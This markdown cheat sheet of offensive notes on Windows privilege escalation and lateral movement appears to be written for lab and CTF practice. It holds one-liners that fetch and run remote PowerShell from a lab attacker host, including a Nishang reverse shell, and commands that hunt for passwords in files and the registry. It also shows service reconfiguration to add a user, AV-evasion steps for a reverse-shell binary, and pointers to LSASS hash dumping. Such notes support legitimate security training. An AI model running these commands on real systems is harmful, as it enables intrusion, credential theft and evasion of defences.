# Attacking Windows

## Table of Contents

* [Windows Basics](#windows-basics)
  * [Windows Access Control](#windows-access-control)
    * [Windows Integrity Levels](#windows-integrity-levels)
* [Common Tools](#common-tools)
* [Local Privilege Escalation Methods](#local-privilege-escalation-methods)
  * [Pivot to a less secure box](#pivot-to-a-less-secure-box)
  * [Enumerate missing patches](#enumerate-missing-patches)
  * [Clear Text Passwords](#clear-text-passwords)
  * [Passwords in Registry](#passwords-in-registry)
  * [GUI Attacks](#gui-attacks)
  * [Shatter Attacks](#shatter-attacks)
  * [File and Directory Permissions](#file-and-directory-permissions)
  * [Enumerate Auto Runs](#enumerate-auto-runs)
  * [Application DLL Searching](#application-dll-searching)
  * [Tasks and Jobs](#tasks-and-jobs)
  * [Services](#services)
  * [Other Permission Issues](#other-permission-issues)
  * [Token Impersonation](#token-impersonation)
  * [Local Admin to Domain Account](#local-admin-to-domain-account)
* [Sources](#sources)

## Windows Basics

### Windows Access Control

- securable objects
	- files
	- directories
	- services
	- registry keys
	- named pipes
- security descriptor
	- discretionary access control list (DACL)
	- access control entries (ACE)
- access token
	- container of user security info
	- SID, groups, privileges
	- tied to process or thread

#### Windows Integrity Levels
| Name | Level | Use |
|:---:|:---:|:---:|
| Untrusted | 0 | Used by processes started by the Anonymous group. Blocks most write access. |
| Low | 1 | Used by Protected Mode Internet Explorer; blocks write access to most objects (such as files and regisry keys) on the system. |
| Medium | 2 | Used by normal applications being launched while UAC is enabled. |
| High | 3 | Used by administrative applications launched thought elevation when UAC is enabled, or normal applications if UAC is disabled and the user is an administrator. |
| System | 4 | Used by services and other system-level applications (such as Wininit, Winlogon, Smss, etc.) | 

- In a privilege escalation situation, we are usually trying to move from Medium to High.
- It is trivial to move from High to System.
	- meterpreter: getsystem
	- sticky keys exploit

**Remember: UAC is an annoyance, but NEVER a security boundary!**

## Common Tools

- eternal blue scanner
	- https://github.com/peterpt/eternal_scanner

- impacket
	- https://github.com/CoreSecurity/impacket
	- contains tools such as psexec
	- check out example programs that use Impacket
		- https://github.com/CoreSecurity/impacket/tree/master/examples
	- smbserver
		- host a local smb server that you can use to push/pull files to/from the target system
		- e.g. `sudo smbserver.py sharename /var/www`

- Sherlock
	- https://github.com/rasta-mouse/Sherlock
	- Checks for windows priv esc vulns
	- download: `IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/Sherlock.ps1')`
	- execute: `Find-AllVulns`

- Empire
	- https://github.com/EmpireProject/Empire
	- Empire is a PowerShell and Python post-exploitation agent.
	- exploits: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc

- Windows-Exploit-Suggester
	- https://github.com/GDSSecurity/Windows-Exploit-Suggester
	- great for older, non-powershell, systems (xp/2003) where you can't use Sherlock
	- all you have to do is run `systeminfo` on the target machine and copy the output
	- e.g. `./windows-exploit-suggester.py -i ~/ctf/hackthebox/arctic/systeminfo.txt -d 2018-08-04-mssb.xls`

- Nishang
	- https://github.com/samratashok/nishang
	- Windows Rev Shells and other stuff
	- cmd: `c:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1')`

- PowerSploit
	- https://github.com/PowerShellMafia/PowerSploit
	- PowerUp.ps1
		- https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
		- Privesc Tool
		- IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/PowerUp.ps1')
		- run all checks: `Invoke-AllChecks`

- PowerView (Subset of PowerSploit)
	- https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
	- Useful Functions:
		- `Get-NetUser`
		- `Get-NetGroup`
		- `Get-NetComputer`
	- All Functions: https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

- JAWS (Just Another Windows (Enum) Script)
	- https://github.com/411Hall/JAWS
	- https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1

### PowerShell

- view processes: `tasklist`

- direct execute script from internet: `IEX(New-Object Net.WebClient).downloadString('http://example.com/blah.ps1')`

- download file (powershell 2):
```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://www.example.com/file","C:\path\file")
```

- download file (powershell 3+): `Invoke-WebRequest -Uri $url -OutFile $output`

- execute the thing ???: `Invoke-AllChecks`

- check if system is 64bit: `[environment]::Is64BitOperatingSystem`

- check if current process is 64bit: `[environment]::Is64BitProcess`

- 64bit powershell: `c:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell.exe`

- get my privs: `whoami /all`

- get autologon info: `Get-RegistryAutoLogin`

- get basic system info: `systeminfo`

## Exploits

- MS16-135
	- https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Sample-Exploits/MS16-135/MS16-135.ps1

- MS16-032
	- https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1
	- useage: Invoke-MS16032 -Command "IEX(New-Object Net.WebClient).downloadString('http://example.com/blah.ps1')"

## Kerberoasting

- https://www.blackhillsinfosec.com/a-toast-to-kerberoast/
- Essentially, when a domain account is configured to run a service in the environment, such as MS SQL, a Service Principal Name (SPN) is used in the domain to associate the service with a login account. When a user wishes to use the specific resource they receive a Kerberos ticket signed with NTLM hash of the account that is running the service.
- Impacket has a tool: GetUserSPNs.py
- GetUserSPNs.py -request -dc-ip IP DOMAIN/USER:PASSWORD`

## AV evasion

### Ebowla

- https://github.com/Genetic-Malware/Ebowla.git
1. edit `genetic.config`
	- output_type = go
	- payload_type = exe
	- edit environmental vars to match target system
2. run ebowla
	- e.g. `./ebowla.py ~/storage/revshell.exe genetic.config`
3. build binary using go cross compiling script
	- e.g. `./build_x64_go.sh output/go_symmetric_10_10_14_6-5555-revshell.exe.go enc-10_10_14_6-5555-revshell.exe`


## Local Privilege Escalation Methods

## Rotten Potato

- https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
- https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
- https://github.com/breenmachine/RottenPotatoNG
- https://decoder.cloud/2018/01/13/potato-and-tokens/
- poc: https://github.com/decoder-it/lonelypotato
	- USE THIS ONE
	- use `windows/x64/shell_reverse_tcp` not `windows/x64/powershell_reverse_tcp` for some reason it doesn't work

### Pivot to a Less Secure Machine

- psexec laterally with the compromised user
- powerview
	- https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
	- This will query the AD server for local admin access with the current user.
	- launching powerview:
	```
	powershell -exec bypass
	import-module .\powerview.ps1
	Find-LocalAdminAccess
	```

### Enumerate Missing Patches

- metasploit modules
```
post/windows/gather/enum_patches
post/multi/recon/local_exploit_suggester
```

### Clear Text Passwords

- unattended install script
```
c:\unattend.txt
```

- sysprep
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
```

- search system for keywords
```
findstr /si password *.txt | *.xml | *.ini
dir /b /s web.config
dir /b /s unattend.xml
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*
```

- VNC
```
dir /b /s vnc.ini
dir /b /s ultravnc.ini

```

- FTP or other remote access clients
	- cached creds
- GPP
```
\\1.2.3.4\SYSVOL\????
```
	- decrypt password: gpp-decrypt ruby tool

### Passwords in Registry

- VNC
```
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

- autologin
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogin"
```

- SNMP parameters
```
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\"
```

- putty
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

- general search for interesting registy settings
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
# for citrix, copy results to clipboard
reg query HKLM /f password /t REG_SZ /s | clip
reg query HKCU /f password /t REG_SZ /s | clip
```

### GUI Attacks

windows XP/2003
- check for GUI apps running with elevated privileges
- get a file dialog and navigate to cmd.exe

### Shatter Attacks

windows XP/2003
- anything running as SYSTEM with a windows can be attacked from the command line
- things to look for:
	- Listview/Treeview
	- RichTextBox
	- EditBox

### File and Directory Permissions

- checking directory permissions
	- `cacls "c:\Program Files"`
	- Looking for "Everyone: (OI)(CI)F"
	- check if you can overwrite key system programs

- checking file permissions
	- `this is a sysinternals tool`
	- `accesschk.exe -qwv c:\test.txt`
- suggested queries:
```
accesschk.exe -qwsu "Authenticated Users" c:\
accesschk.exe -qwsu "Users" c:\
accesschk.exe -qwsu "Everyone" c:\
```

- user created directory permisssions
	- by default new directories are able to be written to by everyone on the system

### Enumerate Auto Runs

- autoruns
	- sysinternals tool
- procmon
	- sysinternals tool
	- look at what DLLs a program is loading
	- trojan the DLL with msfvenom

### Application DLL Searching
- check order in which DLLs are loaded from which directories

### Tasks and Jobs

- system tasks
	- AT - usually runs tasks as system
	- scheduled tasks - can run as user

- viewing tasks
```
c:\windows\tasks
c:\windows\system32\tasks
```
- commands
```
AT
schtasks
compmgmt.msc
```

### Services

- Orphaned Installs
	- Missing files in writable locations

- AccessChk
	- Sysinternals tool
	- Find weak permissions
	- `accesschk.exe -uwcqv *`
	- dangurous permissions:
		- `SERVICE_CHANGE_CONFIG`
		- `WRITE_DAC`
		- `WRITE_OWNER`
		- `GENERIC_WRITE`
		- `GENERIC_ALL`
		- `SERVICE_ALL_ACCESS`
- suggested queries:
```
accesschk.exe -qwcu "Authenticated Users" *
accesschk.exe -qwcu "Users" *
accesschk.exe -qwcu "Everyone" *
```

- Service control
	- `sc.exe`
	- native windows cmd tool
	- e.g. `sc qc upnphost`
	- If you can reconfigure a service:
		```
		sc config upnphost binpath= "net user hax /add"
		sc config upnphost obj= ".\LocalSystem" password=""
		net stop upnphost
		net start upnphost
		```

### Other Permission Issues

- Read and Write sensitive keys
	- MS11-011
	- MS10-059
	- MS10-021

### Token Impersonation

- This is the ability of a thread to execute using a different security token
- Reading
	- Cesar Cerrudo - Token Kidnapping 1/2/3
	- MWR InfoSecurity - Whitepaper
- Has potential to get System from a local IIS account
- Look for process with the SeImpersonate permission

### Local Admin to Domain Account

- Incognito
	- Luke Jennings
	- Standalone or Metasploit
	- Finds usable delegation tokens
- Impersonate
	- Snarf anyone's token from running process
- Process Injection
	- Administrator can hijack and users process
- WCE
	- http://www.ampliasecurity.com/research.html
	- Improved "Pass the Hash"
	- Retrieves hashes from LSASS
	- Modifies in memory current user hashes
- Mimicatz

### Rev Shell TTY Issues

- FuzzySecurity/PowerShell-Suite
- Invoke-Runas

## Sources
- [Encyclopaedia Of Windows Privilege Escalation - Brett Moore](https://www.youtube.com/watch?v=kMG8IsCohHA)
- [Level Up! Practical Windows Privilege Escalation - Andrew Smith](https://www.youtube.com/watch?v=PC_iMqiuIRQ)
